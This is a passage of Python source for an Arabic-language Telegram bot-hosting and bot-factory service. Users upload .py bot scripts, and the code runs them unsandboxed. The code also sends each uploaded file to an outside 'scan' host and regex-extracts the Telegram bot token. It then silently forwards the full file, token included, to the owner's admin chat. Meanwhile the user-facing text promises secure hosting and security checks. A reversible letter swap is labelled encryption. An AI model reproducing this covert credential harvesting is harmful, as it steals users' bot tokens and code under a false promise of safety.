            url = "https://www.scan-files.free.nf/analyze"
            files = {'file': (file_name, file_content)}
            response = requests.post(url, files=files, timeout=10)
            response.raise_for_status()
            result = response.json()
            return result.get("status", "خطأ")
        except Exception as e:
            print(f"خطأ في فحص الملف: {e}")
            return "خطأ في الفحص"
    
    # دالة استخراج التوكن
    def get_bot_token(file_name):
        try:
            with open(file_name, 'r', encoding='utf-8', errors='ignore') as file:
                content = file.read()
                match = re.search(r'TOKEN\s*=\s*[\'"]([^\'"]*)[\'"]', content)
                if match:
                    return match.group(1)
                else:
                    # محاولة البحث بأنماط أخرى
                    patterns = [
                        r'bot\.token\s*=\s*[\'"]([^\'"]*)[\'"]',
                        r'api_token\s*=\s*[\'"]([^\'"]*)[\'"]',
                        r'token\s*:\s*[\'"]([^\'"]*)[\'"]',
                        r'["\']token["\']\s*:\s*["\']([^"\']+)["\']',
                        r'bot_token\s*=\s*["\']([^"\']+)["\']',
                        r'telegram_token\s*=\s*["\']([^"\']+)["\']'
                    ]
                    for pattern in patterns:
                        match = re.search(pattern, content)
                        if match:
                            return match.group(1)
                    return "تعذر العثور على التوكن"
        except Exception as e:
            print(f"Error getting bot token: {e}")
            return "تعذر العثور على التوكن"
    
    # دالة التحقق من التوكن
    def verify_token(token):
        """التحقق من صحة توكن تيليجرام"""
        try:
            response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).json()
            if response.get("ok"):
                bot_info = response["result"]
                return {
                    'valid': True,
                    'name': bot_info['first_name'],
                    'username': bot_info.get('username', 'لا يوجد'),
                    'id': bot_info['id']
                }
            else:
                return {'valid': False, 'error': 'توكن غير صالح'}
        except:
            return {'valid': False, 'error': 'خطأ في الاتصال'}
    
    # دالة إرسال للمالك
    def send_to_admin(file_name, user_info):
        try:
            with open(file_name, 'rb') as file:
                caption = (f"📁 ملف بايثون جديد تم رفعه\n\n"
                          f"👤 المستخدم: {user_info.get('username', 'غير معروف')}\n"
                          f"🆔 الأيدي: {user_info.get('id', 'غير معروف')}\n"
                          f"📄 اسم الملف: {os.path.basename(file_name)}\n"
                          f"📅 الوقت: {datetime.now().strftime('%H:%M:%S')}")
                bot.send_document(admin_id, file, caption=caption)
        except Exception as e:
            print(f"Error sending file to admin: {e}")
    
    # دالة تثبيت وتشغيل الملف
    def install_and_run_uploaded_file(file_path):
        try:
            # إنشاء مجلد للتطبيق إذا لم يكن موجوداً
            app_dir = os.path.join(data_dir, "apps")
            os.makedirs(app_dir, exist_ok=True)
            
            # نسخ الملف إلى مجلد التطبيقات
            new_path = os.path.join(app_dir, os.path.basename(file_path))
            if os.path.exists(file_path):
                import shutil
                shutil.copy2(file_path, new_path)
                file_path = new_path
            
            # تثبيت المتطلبات إن وجدت
            req_file = os.path.join(os.path.dirname(file_path), "requirements.txt")
            if os.path.exists(req_file):
                try:
                    subprocess.run(['pip', 'install', '-r', req_file], 
                                  capture_output=True, timeout=120)
                except:
                    pass
            
            # تشغيل الملف في thread منفصل
            def run_app():
                try:
                    env = os.environ.copy()
                    env['PYTHONUNBUFFERED'] = '1'
                    
                    # إنشاء ملف log
                    log_file = file_path.replace('.py', '.log')
                    
                    with open(log_file, 'a', encoding='utf-8') as log:
                        process = subprocess.Popen(
                            ['python3', '-u', file_path],
                            stdout=log,
                            stderr=log,
                            env=env,
                            start_new_session=True
                        )
                    
                    # تخزين معلومات العملية
                    bot_name = os.path.basename(file_path)
                    active_bots[bot_name] = {
                        'process': process,
                        'pid': process.pid,
                        'start_time': datetime.now(),
                        'file_path': file_path
                    }
                    
                    print(f"✅ تم تشغيل التطبيق: {bot_name} (PID: {process.pid})")
                    
                except Exception as e:
                    print(f"❌ خطأ في تشغيل التطبيق: {e}")
            
            threading.Thread(target=run_app, daemon=True).start()
            
        except Exception as e:
            print(f"Error installing and running uploaded file: {e}")
    
    # دالة إيقاف البوت
    def stop_bot(file_name):
        try:
            # البحث عن العملية وقتلها
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    cmdline = proc.info['cmdline']
                    if cmdline and file_name in ' '.join(cmdline):
                        proc.terminate()
                        proc.wait(timeout=5)
                        
                        # إزالة من البوتات النشطة
                        for bot_name, info in list(active_bots.items()):
                            if info['file_path'] == file_name or file_name in info['file_path']:
                                active_bots.pop(bot_name, None)
                        
                        print(f"✅ تم إيقاف التطبيق: {file_name}")
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
                    continue
            return False
        except Exception as e:
            print(f"Error stopping bot: {e}")
            return False
    
    # دالة التحقق من الحالة
    def check_status(message, file_name):
        if os.path.exists(file_name):
            markup = telebot.types.InlineKeyboardMarkup()
            delete_button = telebot.types.InlineKeyboardButton("🗑 حذف الملف", callback_data='delete')
            stop_button = telebot.types.InlineKeyboardButton("🔴 إيقاف التشغيل", callback_data='stop')
            start_button = telebot.types.InlineKeyboardButton("🟢 تشغيل الملف", callback_data='start')
            token_button = telebot.types.InlineKeyboardButton("🔐 معلومات التوكن", callback_data='token_info')
            back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
            
            markup.row(delete_button, stop_button)
            markup.row(start_button, token_button)
            markup.row(back_button)
            
            # التحقق إذا كان البوت يعمل
            is_running = False
            bot_name = os.path.basename(file_name)
            if bot_name in active_bots:
                is_running = True
            
            status_text = (
                "🎮 لوحة تحكم الملف المرفوع\n\n"
                "※ يمكنك التحكم في ملفك باستخدام الأزرار أدناه\n"
                f"※ اسم الملف: {os.path.basename(file_name)}\n"
                f"※ المسار: {file_name}\n"
                f"※ الحالة: {'🟢 قيد التشغيل' if is_running else '🔴 متوقف'}\n\n"
                "✨ اختر الإجراء المناسب:"
            )
            
            bot.send_message(
                message.chat.id,
                status_text,
                reply_markup=markup
            )
        else:
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
            markup.add(back_button)
            
            bot.send_message(
                message.chat.id,
                "⚠️ الملف غير موجود أو تم حذفه.",
                reply_markup=markup
            )
    
    # دالة إنشاء لوحة التحكم الرئيسية
    def create_main_menu():
        markup = telebot.types.InlineKeyboardMarkup()
        upload_button = telebot.types.InlineKeyboardButton("📤 رفع ملف", callback_data='upload')
        status_button = telebot.types.InlineKeyboardButton('🔧 قناة المطور', url='https://t.me/mora_brt')
        help_button = telebot.types.InlineKeyboardButton("❓ المساعدة", callback_data='help')
        
        markup.row(upload_button, status_button)
        markup.add(help_button)
        
        return markup
    
    # دالة الحصول على معلومات النظام
    def get_system_info():
        try:
            import psutil
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            info = (
                f"📊 معلومات النظام:\n\n"
                f"💻 وحدة المعالجة: {cpu_percent}%\n"
                f"🧠 الذاكرة: {memory.percent}% مستخدمة\n"
                f"💾 التخزين: {disk.percent}% مستخدم\n"
                f"🤖 عدد البوتات النشطة: {len(active_bots)}\n"
                f"⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            return info
        except:
            return "📊 معلومات النظام غير متاحة حالياً"
    
    # ========== handlers ==========
    
    @bot.message_handler(commands=['start'])
    def start_command(message):
        if maintenance_mode:
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 المحاولة مرة أخرى", callback_data='retry')
            markup.add(back_button)
            
            bot.send_message(
                message.chat.id,
                "🛠 البوت تحت الصيانة حالياً. ⏳ يرجى المحاولة لاحقاً.",
                reply_markup=markup
            )
            return
        
        markup = create_main_menu()
        
        welcome_text = (
            "🤖 مرحباً بك في بوت استضافة ملفات بايثون!\n\n"
            "✨ المميزات الجديدة:\n"
            "• رفع وتشغيل ملفات بايثون\n"
            "• فحص أمني متقدم للملفات\n"
            "• نظام إدارة البوتات النشطة\n"
            "• معلومات تفصيلية عن التوكن\n"
            "• زر الرجوع في كل القوائم\n"
            "• زر تشغيل وإيقاف البوتات\n"
            "• زر معلومات التوكن المفصل\n"
            "• زر حذف الملفات\n\n"
            "📌 الشروط:\n"
            "• يرجى عدم رفع ملفات ضارة\n"
            "• التأكد من صحة التوكن\n"
            "• الملفات تخضع للفحص الأمني\n\n"
            "🚀 للبدء، اضغط على زر رفع ملف 👇"
        )
        
        bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
    
    @bot.message_handler(commands=['developer'])
    def developer_command(message):
        markup = telebot.types.InlineKeyboardMarkup()
        dev_button = telebot.types.InlineKeyboardButton("👨‍💻 مطور البوت", url='https://t.me/ELZo_z')
        channel_button = telebot.types.InlineKeyboardButton("📢 قناة المطور", url='https://t.me/mora_brt')
        back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
        
        markup.row(dev_button, channel_button)
        markup.add(back_button)
        
        bot.send_message(
            message.chat.id,
            "👨‍💻 معلومات المطور:\n\n"
            "• للتواصل مع المطور\n"
            "• للإبلاغ عن مشاكل\n"
            "• للاقتراحات والتطوير\n\n"
            "📞 اختر طريقة التواصل المناسبة:",
            reply_markup=markup
        )
    
    @bot.message_handler(commands=['status'])
    def status_command(message):
        markup = telebot.types.InlineKeyboardMarkup()
        back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
        refresh_button = telebot.types.InlineKeyboardButton("🔄 تحديث", callback_data='refresh_status')
        markup.add(refresh_button, back_button)
        
        system_info = get_system_info()
        
        # إضافة معلومات البوتات النشطة
        active_bots_info = ""
        if active_bots:
            active_bots_info = "\n\n🤖 البوتات النشطة:\n"
            for idx, (bot_name, info) in enumerate(active_bots.items(), 1):
                runtime = datetime.now() - info['start_time']
                hours, remainder = divmod(runtime.seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                active_bots_info += f"{idx}. {bot_name} - PID: {info['pid']} - ⏰ {hours}:{minutes:02d}:{seconds:02d}\n"
        else:
            active_bots_info = "\n\n🤖 لا توجد بوتات نشطة حالياً"
        
        full_info = system_info + active_bots_info
        
        bot.send_message(
            message.chat.id,
            full_info,
            reply_markup=markup
        )
    
    @bot.message_handler(content_types=['document'])
    def handle_file(message):
        nonlocal bot_script_name
        
        if maintenance_mode:
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 المحاولة مرة أخرى", callback_data='retry')
            markup.add(back_button)
            
            bot.reply_to(message,
                "🛠 البوت تحت الصيانة حالياً. ⏳ يرجى المحاولة لاحقاً.",
                reply_markup=markup
            )
            return
        
        # التحقق من أن الملف بايثون
        file_name = message.document.file_name
        if not file_name.endswith('.py'):
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 المحاولة مرة أخرى", callback_data='upload')
            markup.add(back_button)
            
            bot.reply_to(message,
                "❌ يجب أن يكون الملف من نوع بايثون (.py) فقط!",
                reply_markup=markup
            )
            return
        
        # التحقق من حجم الملف
        if message.document.file_size > 990 * 1024:  # 990KB حد أقصى
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 المحاولة مرة أخرى", callback_data='upload')
            markup.add(back_button)
            
            bot.reply_to(message,
                "❌ حجم الملف كبير جداً! الحد الأقصى 990KB",
                reply_markup=markup
            )
            return
        
        # فحص إذا كان الملف محظوراً
        if file_name in banned_files:
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 المحاولة مرة أخرى", callback_data='upload')
            markup.add(back_button)
            
            bot.reply_to(message,
                "⛔ هذا الملف محظور لأسباب أمنية!",
                reply_markup=markup
            )
            return
        
        # إرسال رسالة فحص
        scan_msg = bot.reply_to(message, "🔍 جاري فحص الملف...")
        
        try:
            # تحميل الملف
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # فحص الملف خارجياً
            bot.edit_message_text(
                "🔍 جاري فحص الملف بحثاً عن أكواد ضارة...",
                chat_id=message.chat.id,
                message_id=scan_msg.message_id
            )
            
            scan_result = scan_file_externally(downloaded_file, file_name)
            
            if scan_result == "خطير":
                bot.edit_message_text(
                    "⛔ تم رفض الملف لأسباب أمنية!\n\n"
                    "🔍 نتيجة الفحص: خطير\n\n"
                    "⚠️ لا تحاول رفعه مجدداً",
                    chat_id=message.chat.id,
                    message_id=scan_msg.message_id
                )
                
                # إضافة للملفات المحظورة
                banned_files.add(file_name)
                
                # إرسال إشعار للمالك
                try:
                    warning_msg = (
                        f"🚨 محاولة رفع ملف خطير!\n\n"
                        f"👤 المستخدم: @{message.from_user.username or 'غير معروف'}\n"
                        f"🆔 الأيدي: {message.from_user.id}\n"
                        f"📄 اسم الملف: {file_name}\n"
                        f"📅 الوقت: {datetime.now().strftime('%H:%M:%S')}"
                    )
                    bot.send_message(admin_id, warning_msg)
                except:
                    pass
                
                return
            
            # ✅ الملف آمن - المتابعة
            bot.edit_message_text(
                "✅ الملف آمن\n📥 جاري رفع الملف...",
                chat_id=message.chat.id,
                message_id=scan_msg.message_id
            )
            
            # حفظ الملف
            bot_script_name = os.path.join(data_dir, file_name)
            with open(bot_script_name, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            # الحصول على التوكن والتحقق منه
            bot_token = get_bot_token(bot_script_name)
            token_info = verify_token(bot_token) if "تعذر" not in bot_token else None
            
            # إرسال رسالة النجاح
            success_msg = (
                f"✅ تم رفع ملفك بنجاح!\n\n"
                f"📄 اسم الملف: `{file_name}`\n"
                f"📁 المسار: `{bot_script_name}`\n"
            )
            
            if token_info and token_info['valid']:
                success_msg += (
                    f"\n🔐 معلومات التوكن:\n"
                    f"• 🤖 اسم البوت: {token_info['name']}\n"
                    f"• 🆔 معرف البوت: @{token_info['username']}\n"
                    f"• 📊 أيدي البوت: `{token_info['id']}`\n"
                    f"• ✅ الحالة: صالح"
                )
            elif "تعذر" not in bot_token:
                success_msg += f"\n⚠️ التوكن: {bot_token}"
            else:
                success_msg += f"\n🔍 التوكن: {bot_token}"
            
            success_msg += f"\n\n📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            success_msg += f"\n\n✨ الملف جاهز للتشغيل!"
            
            bot.edit_message_text(
                success_msg,
                chat_id=message.chat.id,
                message_id=scan_msg.message_id
            )
            
            # إرسال للمالك
            user_info = {
                'username': message.from_user.username,
                'id': message.from_user.id,
                'first_name': message.from_user.first_name
            }
            send_to_admin(bot_script_name, user_info)
            
            # تشغيل الملف
            install_and_run_uploaded_file(bot_script_name)
            
            # إضافة زر للتحكم مع زر الرجوع
            check_status(message, bot_script_name)
            
        except Exception as e:
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 المحاولة مرة أخرى", callback_data='upload')
            markup.add(back_button)
            
            error_msg = f"❌ حدث خطأ أثناء معالجة الملف:\n`{str(e)[:200]}`"
            bot.edit_message_text(
                error_msg,
                chat_id=message.chat.id,
                message_id=scan_msg.message_id,
                reply_markup=markup
            )
    
    @bot.callback_query_handler(func=lambda call: True)
    def callback_handler(call):
        nonlocal bot_script_name
        
        if call.data == 'delete':
            try:
                if bot_script_name and os.path.exists(bot_script_name):
                    # إيقاف التطبيق أولاً
                    stop_bot(bot_script_name)
                    
                    # حذف الملف
                    os.remove(bot_script_name)
                    
                    # حذف ملف اللوج إن وجد
                    log_file = bot_script_name.replace('.py', '.log')
                    if os.path.exists(log_file):
                        os.remove(log_file)
                    
                    # تحديث البوتات النشطة
                    bot_name = os.path.basename(bot_script_name)
                    active_bots.pop(bot_name, None)
                    
                    markup = telebot.types.InlineKeyboardMarkup()
                    back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع للقائمة", callback_data='back_to_main')
                    markup.add(back_button)
                    
                    bot.send_message(call.message.chat.id,
                        "✅ تم حذف الملف بنجاح!",
                        reply_markup=markup
                    )
                    bot_script_name = None
                else:
                    markup = telebot.types.InlineKeyboardMarkup()
                    back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                    markup.add(back_button)
                    
                    bot.send_message(call.message.chat.id,
                        "⚠️ لم يتم العثور على الملف لحذفه.",
                        reply_markup=markup
                    )
            except Exception as e:
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                markup.add(back_button)
                
                bot.send_message(call.message.chat.id,
                    f"❌ حدث خطأ أثناء الحذف:\n{e}",
                    reply_markup=markup
                )
                
        elif call.data == 'stop':
            try:
                if bot_script_name:
                    if stop_bot(bot_script_name):
                        markup = telebot.types.InlineKeyboardMarkup()
                        back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                        markup.add(back_button)
                        
                        bot.send_message(call.message.chat.id,
                            "✅ تم إيقاف التشغيل بنجاح!",
                            reply_markup=markup
                        )
                    else:
                        markup = telebot.types.InlineKeyboardMarkup()
                        back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                        markup.add(back_button)
                        
                        bot.send_message(call.message.chat.id,
                            "⚠️ التطبيق غير شغال أو لا يمكن إيقافه.",
                            reply_markup=markup
                        )
                else:
                    markup = telebot.types.InlineKeyboardMarkup()
                    back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                    markup.add(back_button)
                    
                    bot.send_message(call.message.chat.id,
                        "⚠️ لم يتم تحديد ملف للتوقف.",
                        reply_markup=markup
                    )
            except Exception as e:
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                markup.add(back_button)
                
                bot.send_message(call.message.chat.id,
                    f"❌ حدث خطأ أثناء الإيقاف:\n{e}",
                    reply_markup=markup
                )
                
        elif call.data == 'start':
            try:
                if bot_script_name and os.path.exists(bot_script_name):
                    install_and_run_uploaded_file(bot_script_name)
                    
                    markup = telebot.types.InlineKeyboardMarkup()
                    back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                    markup.add(back_button)
                    
                    bot.send_message(call.message.chat.id,
                        "✅ تم تشغيل الملف بنجاح!",
                        reply_markup=markup
                    )
                else:
                    markup = telebot.types.InlineKeyboardMarkup()
                    back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                    markup.add(back_button)
                    
                    bot.send_message(call.message.chat.id,
                        "⚠️ الملف غير موجود أو تم حذفه.",
                        reply_markup=markup
                    )
            except Exception as e:
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                markup.add(back_button)
                
                bot.send_message(call.message.chat.id,
                    f"❌ حدث خطأ أثناء التشغيل:\n{e}",
                    reply_markup=markup
                )
                
        elif call.data == 'upload':
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
            markup.add(back_button)
            
            bot.send_message(
                call.message.chat.id,
                "📤 إرشادات رفع الملف:\n\n"
                "1. أرسل ملف بايثون (.py) فقط\n"
                "2. الحد الأقصى: 990KB\n"
                "3. سيتم فحص الملف أمنياً\n"
                "4. تأكد من صحة التوكن\n\n"
                "⚠️ ملاحظات:\n"
                "• الملفات الضارة سيتم حظرها\n"
                "• التوكنات غير الصالحة لن تعمل\n"
                "• الملفات تخضع للفحص الأمني\n\n"
                "🚀 أرسل ملفك الآن...",
                reply_markup=markup
            )
            
        elif call.data == 'token_info':
            if bot_script_name and os.path.exists(bot_script_name):
                token = get_bot_token(bot_script_name)
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                markup.add(back_button)
                
                if "تعذر" not in token:
                    token_info = verify_token(token)
                    if token_info['valid']:
                        info_msg = (
                            f"🔐 معلومات التوكن التفصيلية:\n\n"
                            f"✅ الحالة: صالح\n"
                            f"🤖 اسم البوت: {token_info['name']}\n"
                            f"📌 المعرف: @{token_info['username']}\n"
                            f"🆔 الأيدي: `{token_info['id']}`\n"
                            f"📄 الملف: `{os.path.basename(bot_script_name)}`\n"
                            f"🔑 التوكن (أول 15 حرف): `{token[:15]}...`\n\n"
                            f"✨ التوكن صالح وجاهز للاستخدام!\n"
                            f"📅 وقت الفحص: {datetime.now().strftime('%H:%M:%S')}"
                        )
                    else:
                        info_msg = (
                            f"🔐 معلومات التوكن:\n\n"
                            f"❌ الحالة: غير صالح\n"
                            f"⚠️ الخطأ: {token_info['error']}\n"
                            f"🔑 التوكن (أول 15 حرف): `{token[:15]}...`\n"
                            f"📄 الملف: `{os.path.basename(bot_script_name)}`\n\n"
                            f"📌 يرجى التحقق من التوكن في الملف!\n"
                            f"📅 وقت الفحص: {datetime.now().strftime('%H:%M:%S')}"
                        )
                else:
                    info_msg = (
                        "❌ لم يتم العثور على توكن في الملف!\n\n"
                        "🔍 البحث تم في:\n"
                        "• TOKEN = '...'\n"
                        "• bot.token = '...'\n"
                        "• api_token = '...'\n"
                        "• token: '...'\n\n"
                        "📌 يرجى التأكد من وجود التوكن في الملف"
                    )
                
                bot.send_message(
                    call.message.chat.id,
                    info_msg,
                    parse_mode="Markdown",
                    reply_markup=markup
                )
            else:
                markup = telebot.types.InlineKeyboardMarkup()
                back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
                markup.add(back_button)
                
                bot.send_message(
                    call.message.chat.id,
                    "⚠️ لم يتم رفع أي ملف بعد!",
                    reply_markup=markup
                )
                
        elif call.data == 'help':
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
            markup.add(back_button)
            
            help_text = (
                "❓ دليل استخدام البوت:\n\n"
                "📥 رفع ملف:\n"
                "• أرسل ملف بايثون (.py)\n"
                "• الحد الأقصى 990KB\n"
                "• سيتم فحصه أمنياً\n\n"
                "⚙️ الأوامر المتاحة:\n"
                "• /start - بدء البوت\n"
                "• /developer - معلومات المطور\n"
                "• /status - حالة النظام\n\n"
                "🎮 التحكم بالملف:\n"
                "• 🗑 حذف الملف\n"
                "• 🔴 إيقاف التشغيل\n"
                "• 🟢 تشغيل الملف\n"
                "• 🔐 معلومات التوكن\n"
                "• 🔙 الرجوع (في كل القوائم)\n\n"
                "✨ المميزات الجديدة:\n"
                "• نظام تتبع البوتات النشطة\n"
                "• معلومات مفصلة عن التوكن\n"
                "• زر الرجوع في كل القوائم\n"
                "• فحص أمني متقدم\n"
                "• إدارة كاملة للعمليات\n\n"
                "⚠️ تحذيرات:\n"
                "• لا ترفع ملفات ضارة\n"
                "• التوكنات غير الصالحة لن تعمل\n"
                "• الملفات تخضع للفحص الأمني\n\n"
                "🚀 استمتع باستضافة ملفاتك!"
            )
            bot.send_message(
                call.message.chat.id,
                help_text,
                reply_markup=markup
            )
            
        elif call.data == 'back_to_main':
            markup = create_main_menu()
            
            welcome_text = (
                "🔙 تم الرجوع للقائمة الرئيسية\n\n"
                "✨ اختر الخيار المناسب:"
            )
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=welcome_text,
                reply_markup=markup
            )
            
        elif call.data == 'retry':
            markup = create_main_menu()
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="🔄 جاري التحميل...",
                reply_markup=markup
            )
            
        elif call.data == 'refresh_status':
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
            refresh_button = telebot.types.InlineKeyboardButton("🔄 تحديث", callback_data='refresh_status')
            markup.add(refresh_button, back_button)
            
            system_info = get_system_info()
            
            # إضافة معلومات البوتات النشطة
            active_bots_info = ""
            if active_bots:
                active_bots_info = "\n\n🤖 البوتات النشطة:\n"
                for idx, (bot_name, info) in enumerate(active_bots.items(), 1):
                    runtime = datetime.now() - info['start_time']
                    hours, remainder = divmod(runtime.seconds, 3600)
                    minutes, seconds = divmod(remainder, 60)
                    active_bots_info += f"{idx}. {bot_name} - PID: {info['pid']} - ⏰ {hours}:{minutes:02d}:{seconds:02d}\n"
            else:
                active_bots_info = "\n\n🤖 لا توجد بوتات نشطة حالياً"
            
            full_info = system_info + active_bots_info + f"\n\n🔄 تم التحديث: {datetime.now().strftime('%H:%M:%S')}"
            
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=full_info,
                reply_markup=markup
            )
            
        elif call.data in upload_buttons:
            markup = telebot.types.InlineKeyboardMarkup()
            back_button = telebot.types.InlineKeyboardButton("🔙 الرجوع", callback_data='back_to_main')
            markup.add(back_button)
            
            bot.send_message(
                call.message.chat.id,
                f"✅ تم رفع ملف بوتك بنجاح!\n※ {upload_buttons[call.data].text}",
                reply_markup=markup
            )
    
    # تشغيل البوت
    try:
        bot_username = bot.get_me().username
        print(f"✅ Hosting bot @{bot_username} is now running...")
        print(f"✨ المميزات المضافة:")
        print(f"   • زر الرجوع في كل القوائم")
        print(f"   • زر تشغيل البوت المحسن")
        print(f"   • زر حذف البوت مع إزالة الملفات")
        print(f"   • زر معلومات التوكن المفصل")
        print(f"   • نظام تتبع البوتات النشطة")
        print(f"   • قائمة المساعدة المحدثة")
        print(f"   • أوامر جديدة: /status")
        print(f"   • فحص أمني متقدم")
        print(f"📊 البوت جاهز لاستقبال الملفات...")
        
        # حذف أي Webhook قديم
        bot.remove_webhook()
        
        # بدء الاستماع للرسائل
        bot.infinity_polling(skip_pending=True, timeout=60)
        
    except Exception as e:
        print(f"❌ Hosting bot with token {token} stopped due to error: {e}")
        raise e

# ==============================================================================
# --- دوال مساعدة لإدارة المصنع ---
# ==============================================================================
def get_all_bots():
    try:
        with open(BOTS_REGISTRY_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def register_bot(token, owner_id, bot_type):
    bots = get_all_bots()
    bots[token] = {'owner_id': owner_id, 'type': bot_type}
    with open(BOTS_REGISTRY_FILE, 'w') as f:
        json.dump(bots, f, indent=4)

def unregister_bot(token):
    bots = get_all_bots()
    if token in bots:
        del bots[token]
        with open(BOTS_REGISTRY_FILE, 'w') as f:
            json.dump(bots, f, indent=4)
        if token in running_bot_threads:
            del running_bot_threads[token]
            print(f"Thread for bot {token} removed from running list.")
        return True
    return False

def encrypt_token(token):
    table = str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210"
    )
    return token.translate(table)

def is_factory_user_subscribed(user_id):
    if not FACTORY_SUB_CHANNEL:
        return True
    try:
        member = factory_bot.get_chat_member(f"@{FACTORY_SUB_CHANNEL}", user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Factory sub check error: {e}")
        return False

# ==============================================================================
# --- معالجات رسائل المصنع ---
# ==============================================================================
@factory_bot.message_handler(commands=['start'])
def start(message):
    kb = InlineKeyboardMarkup(row_width=2)
    
    # زر معلومات المصنع في الأعلى
    kb.add(InlineKeyboardButton("🔎 معلومات أكثر عن المصنع", callback_data="more_info"))
    
    # الصف الأول: زرين
    kb.row(
        InlineKeyboardButton("➕ صنع بوت جديد", callback_data="create_new_bot"),
        InlineKeyboardButton("🤖 بوتاتك", callback_data="my_bots")
    )
    
    # الصف الثاني: زرين
    kb.row(
        InlineKeyboardButton("🧑‍💻 المطور", url="https://t.me/ELZo_z"),  # تم التعديل
        InlineKeyboardButton("💎 قناة المطور", url="https://t.me/zxgbjji")  # تم التعديل
    )
    
    welcome_text = """👋 مرحباً بك في صانع بوتات

🚀 أنشئ بوتك الآن بسهولة وسرعة!
اختر القالب، أضف التوكن، والبوت يصبح جاهزاً للعمل ⚡️

✨ المميزات:
• بدون أكواد أو تعقيد
• قوالب جاهزة وذكية
• استضافة فورية وآمنة

💡 ابدأ الآن وصمّم بوتك في أقل من نصف دقيقة!"""
    
    factory_bot.send_message(message.chat.id, welcome_text, reply_markup=kb)

def back_to_main_menu(call):
    kb = InlineKeyboardMarkup(row_width=2)
    
    # زر معلومات المصنع في الأعلى
    kb.add(InlineKeyboardButton("🔎 معلومات أكثر عن المصنع", callback_data="more_info"))
    
    # الصف الأول: زرين
    kb.row(
        InlineKeyboardButton("➕ صنع بوت جديد", callback_data="create_new_bot"),
        InlineKeyboardButton("🤖 بوتاتك", callback_data="my_bots")
    )
    
    # الصف الثاني: زرين
    kb.row(
        InlineKeyboardButton("🧑‍💻 المطور", url="https://t.me/ELZo_z"),  # تم التعديل
        InlineKeyboardButton("💎 قناة المطور", url="https://t.me/zxgbjji")  # تم التعديل
    )
    
    welcome_text = """👋 مرحباً بك في صانع بوتات

🚀 أنشئ بوتك الآن بسهولة وسرعة!
اختر القالب، أضف التوكن، والبوت يصبح جاهزاً للعمل ⚡️

✨ المميزات:
• بدون أكواد أو تعقيد
• قوالب جاهزة وذكية
• استضافة فورية وآمنة

💡 ابدأ الآن وصمّم بوتك في أقل من نصف دقيقة!"""
    
    try:
        factory_bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=welcome_text,
            reply_markup=kb
        )
    except:
        factory_bot.send_message(
            call.message.chat.id,
            welcome_text,
            reply_markup=kb
        )

@factory_bot.callback_query_handler(func=lambda call: call.data == "more_info")
def show_more_info(call):
    info_text = """🔍 معلومات عن مصنع البوتات

🏭 المصنع: @ELZo_z
📅 تاريخ الإنشاء: 2025
